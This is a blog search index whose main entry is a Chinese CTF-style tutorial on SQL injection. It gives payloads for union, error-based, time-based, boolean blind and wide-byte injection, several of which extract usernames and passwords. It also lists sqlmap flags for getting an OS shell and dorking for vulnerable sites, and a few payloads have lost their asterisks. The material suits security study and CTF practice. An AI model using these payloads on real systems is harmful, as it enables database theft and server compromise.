<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/01/11/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/01/11/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>针对SQL注入的攻击行为可描述为通过用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序意料之外结果的攻击行为。</p><p>其成因可归结为以下两个原理叠加造成：</p><ol><li>程序编写者在处理程序和数据库交互时，使用字符串<strong>拼接的方式构造SQL语句</strong>。</li><li><strong>未对用户可控参数进行足够的过滤</strong>便将参数内容拼接进入到SQL语句中。</li></ol><hr><h2 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2.漏洞危害"></a>2.漏洞危害</h2><p>SQL注入漏洞根据不同的标准，从数据类型分类来看 SQL注入分为数字型和字符型。 数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。 字符型注入正好相反 按照提交数据的位置分类GET、POST、Cookie和称GPC 数据库对基本的数据类型分为三大类：数字、文本、时间</p><hr><h2 id="3-寻找SQL注入"><a href="#3-寻找SQL注入" class="headerlink" title="3.寻找SQL注入"></a>3.寻找SQL注入</h2><p>测试注入点：</p><ol><li>在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</li><li>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))。+1、-1   有变化有回显考虑联合查询；有变化有报错考虑报错注入；没变化没报错没回显考虑布尔盲注；没有以上情况，考虑延时注入</li><li>通过构造get、post、cookie请求再相应的http头信息等查找敏感信息</li><li>通过构造一些语句，检测服务器中响应的异常</li></ol><hr><h2 id="4-MySQL注入"><a href="#4-MySQL注入" class="headerlink" title="4.MySQL注入"></a>4.MySQL注入</h2><h3 id="1-普通注入"><a href="#1-普通注入" class="headerlink" title="1.普通注入"></a>1.普通注入</h3><h5 id="1-判断字段个数（列数）"><a href="#1-判断字段个数（列数）" class="headerlink" title="1.判断字段个数（列数）"></a>1.判断字段个数（列数）</h5><p>使用<code>order by</code>语句来判断当前select 语句所查询的虚拟列表的列数。</p><p><code>order by</code>语句本意时按照某一列进行排序，在mysql 中可以使用数字来代替具体的列名，比如<code>order by 1</code> 就是按照第一列进行排序，如果mysql 没有找到对应的列，就会报错<code>Unkown column</code>.我们可以依次增加数字，直到数据库报错。</p><p>得到字段个数之后，可以尝试构造联合查询语句<br>这里我们并不知道表名，根据mysql 数据库的特性，select 语句执行过程中，并不需要指定表名。</p><p>页面显示的是第一张虚拟表的内容,那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL，语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=33&#x27; and 1=2 union select 1,2,3,4,5,6,7,8,9,10,-- +</span><br><span class="line">?id=-33&#x27; 1=2 union select 1,2,3,4,5,6,7,8,9,10,-- +</span><br></pre></td></tr></table></figure><h5 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3-- +</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata #</span><br></pre></td></tr></table></figure><h5 id="3-数据表"><a href="#3-数据表" class="headerlink" title="3.数据表"></a>3.数据表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;数据库&#x27;#</span><br></pre></td></tr></table></figure><h5 id="4-字段"><a href="#4-字段" class="headerlink" title="4.字段"></a>4.字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;数据表&#x27;#</span><br></pre></td></tr></table></figure><h5 id="5-数据值"><a href="#5-数据值" class="headerlink" title="5.数据值"></a>5.数据值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名--+</span><br></pre></td></tr></table></figure><h5 id="6-一些其他函数"><a href="#6-一些其他函数" class="headerlink" title="6.一些其他函数"></a>6.一些其他函数</h5><p><code>system_user()</code>系统用户名；<code>user()</code>用户名；<code>current_user()</code>当前用户名；<code>database()</code>数据库名；<code>version() MYSQL</code>数据库版本；<code>load_file() </code>MYSQL读取本地文件的函数；<code>@@datadir </code>读取数据库路径；<code>@@basedir MYSQL </code>安装路径；<code>@@version_compile_os </code>操作系统</p><p>多条数据显示函数：<code>concat()、group_concat()、concat_ws()</code></p><hr><h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><h5 id="1-extractvalue函数"><a href="#1-extractvalue函数" class="headerlink" title="1.extractvalue函数"></a>1.extractvalue函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+ (版本号)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))--+ (操作系统)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))--+ （数据库）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e))--+ （数据表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e))--+（字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))--+ （数据）</span><br></pre></td></tr></table></figure><h5 id="2-updatexml函数"><a href="#2-updatexml函数" class="headerlink" title="2.updatexml函数"></a>2.updatexml函数</h5><p>细节问题： <code>extractvalue()</code>基本一样，改个关键字<code>updatexml</code>即可,与<code>extractvalue</code>有个很大的区别实在末尾注入加上，如：<code>（1，concat(select @@version),1)</code>,而extractvalue函数末尾不加1（数值）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+ （数据库）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+ （数据表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 3,1),0x7e),1)--+ （字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)--+ （数据）</span><br></pre></td></tr></table></figure><h5 id="3-floor函数"><a href="#3-floor函数" class="headerlink" title="3.floor函数"></a>3.floor函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ (数据库，不断改变limit得到其他)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （users表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （password字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （数值）</span><br></pre></td></tr></table></figure><hr><h3 id="3-延时注入"><a href="#3-延时注入" class="headerlink" title="3.延时注入"></a>3.延时注入</h3><h5 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5)--+ //正常休眠</span><br><span class="line">?id=1&quot; and sleep(5)--+ //无休眠</span><br><span class="line">?id=1&#x27;) and sleep(5)--+//无休眠</span><br><span class="line">?id=1&quot;) and sleep(5)--+//无休眠</span><br><span class="line">?id=1&#x27; and if(length(database())=8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><h5 id="2-获取数据库"><a href="#2-获取数据库" class="headerlink" title="2.获取数据库"></a>2.获取数据库</h5><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以依次类推了。substr(database(),N,1)可以通过改变N的值来判断数据的第几个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,1,sleep(10))-- +</span><br></pre></td></tr></table></figure><h5 id="3-获取数据表"><a href="#3-获取数据表" class="headerlink" title="3.获取数据表"></a>3.获取数据表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot;limit 0,1),1,1)))=101,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><hr><h3 id="4-布尔注入"><a href="#4-布尔注入" class="headerlink" title="4.布尔注入"></a>4.布尔注入</h3><p>判断是否存在布尔盲注(一般页面屏蔽了错显，正确类错误类都返回对应相同的页面)—-布尔注入(mysql5.0及以上自带库信息，利用ascii转换数字判断，为了更快捷的获取结果，利用工具burp suit快速组合）</p><h5 id="1-判断是否存在布尔盲注"><a href="#1-判断是否存在布尔盲注" class="headerlink" title="1.判断是否存在布尔盲注"></a>1.判断是否存在布尔盲注</h5><p><code>order by 1,2… </code>判断当前字段数，<code>union select 1,2 …</code> 查询成功但是发现无输出点展示，结论：屏蔽联合查询输出点，可能使用布尔盲注能注入</p><h5 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h5><p>可手工，也可利用工具brupsuit，提高效率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from information_Schema.tables where table_schema=database())=3 </span><br></pre></td></tr></table></figure><p>可通过大于小于快速锁定范围，查看库，查看库里表名数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from information_Schema.tables where table_schema=database() limit 0,1)=6</span><br></pre></td></tr></table></figure><p>这里可以通过<code>length()</code>函数可以查看第一个表名的字符数长度为6，然后可以limit 一条条看名表字符长度.此刻我们知道表的长度及库名，我们可通过ascii函数转变为数字来判断,一个一个字符来确认表名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from information_Schema.tables where table_schema=database() limit 0,1),1,1))</span><br><span class="line">=108</span><br></pre></td></tr></table></figure><p>这里可以确认第一个字符为108，<code>substr(str，起始位，截取位数)</code>截取函数，sacii（str）函数将单个字符转化为十六进制数字.</p><p>同样得方法可以获得字段及记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select column_name from information_Schema.columns where table_Schema=database() and table_name=“xxx” limit 0,1),1,1))=90 获取字段</span><br><span class="line">and ascii(substr((select xxx from xxx limit 0,1),1,1))=90 获取数据</span><br></pre></td></tr></table></figure><hr><h3 id="5-宽字节注入"><a href="#5-宽字节注入" class="headerlink" title="5.宽字节注入"></a>5.宽字节注入</h3><p>前提</p><ol><li><p>使用了addslashes()函数</p></li><li><p>数据库设置了编码模式为GBK</p></li></ol><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; and 1=1 --+</span><br><span class="line">?id=%df&#x27; and 1=2 --+</span><br><span class="line">?id=-1%df&#x27; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><hr><h3 id="6-sqlmap"><a href="#6-sqlmap" class="headerlink" title="6.sqlmap"></a>6.sqlmap</h3><h5 id="1-get注入"><a href="#1-get注入" class="headerlink" title="1.get注入"></a>1.get注入</h5><p>-u “url”    检测注入点<br>–dbs       列出所有数据库的名字<br>–current-db    列出当前数据的名<br>-D      指定一个数据库<br>–tables    列出表名<br>-T  指定表名<br>–columns   列出所有字段名<br>-C  指定字段<br>–dump  列出字段内容</p><h5 id="2-post注入"><a href="#2-post注入" class="headerlink" title="2.post注入"></a>2.post注入</h5><p>-r post.txt 从文件中读入http请求（post.txt是用burpsuite抓取得post数据包构成）<br>–os-shell  获取shell<br>sqlmap -g “inurl:php?id&#x3D;”   利用google 自动搜索注入点</p><h5 id="3-携带cookie-的认证"><a href="#3-携带cookie-的认证" class="headerlink" title="3.携带cookie 的认证"></a>3.携带cookie 的认证</h5><p>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别<br>–cookie “”</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[#footer {    background: transparent !important;}#page-header{    background: transparent !important;}#footer::before{    background: transparent !important;}#page-header::before{    background: transparent !important;}[data-theme="dark"] #footer::before{    background: transparent !important;}[data-theme="dark"] #page-header::before{    background: transparent !important;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
